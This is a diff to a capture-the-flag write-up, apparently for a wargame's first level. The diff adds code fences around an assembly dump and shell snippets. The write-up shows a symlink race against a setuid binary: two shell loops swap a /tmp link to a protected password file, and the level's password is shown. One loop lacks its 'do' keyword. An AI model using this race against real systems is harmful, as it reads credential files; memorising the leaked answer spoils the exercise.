@@ -1,7 +1,8 @@
 
-/mazemmaze0 has privilege of maze0 at the begining, and then it asks for more privilages 
+/maze/maze0 has privileges of maze0 at the begining, and then it asks for more privilages 
 
 Dump of assembler code for function main:
+```assembly
    0x0804854b <+0>:	push   ebp
    0x0804854c <+1>:	mov    ebp,esp
    0x0804854e <+3>:	push   esi
@@ -56,6 +57,7 @@ Dump of assembler code for function main:
    0x080485dd <+146>:	pop    esi
    0x080485de <+147>:	pop    ebp
    0x080485df <+148>:	ret
+   ```
 
 file = /tmp/128ecf542a35ac5270a87dc740918404
 
@@ -66,17 +68,19 @@ starting /maze/maze0 (on another procces)
 changing ln -s to maze1 password
 
 implementetion:
+```sh
 while [ 1 ];
 do
 /maze/maze0
 done;
-
+```
 on another window:
-
+```sh
 while [ 1 ];
 ln -s /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404
 ln -s /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
 done;
+```
 
 we get:
 hashaachon
